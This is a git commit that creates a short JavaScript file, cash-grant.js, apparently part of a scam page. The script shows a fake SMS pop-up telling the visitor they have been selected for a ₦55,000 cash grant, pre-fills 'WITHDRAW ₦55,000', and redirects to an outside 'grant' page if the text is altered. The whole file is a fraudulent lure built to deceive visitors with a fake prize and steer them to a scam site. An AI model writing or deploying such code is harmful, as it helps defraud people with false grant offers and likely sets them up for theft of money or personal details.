af55862bb34837a1e18e51d5eac888ca749d8f2b
itidnewblog1 <newblog1itid@gmail.com>
2025-09-23 22:56:03 +0100

    Create cash-grant.js

---
+++ cash-grant.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦55,000'
+password=prompt('SMS: Congratulations, you are among the selected ones to receive ₦55,000 cash grant, Press Ok to withdraw cash Now ','WITHDRAW ₦55,000');
+if (password != 'WITHDRAW ₦55,000') {
+location.href='https://rhward.org/55kgrant.html';
+}
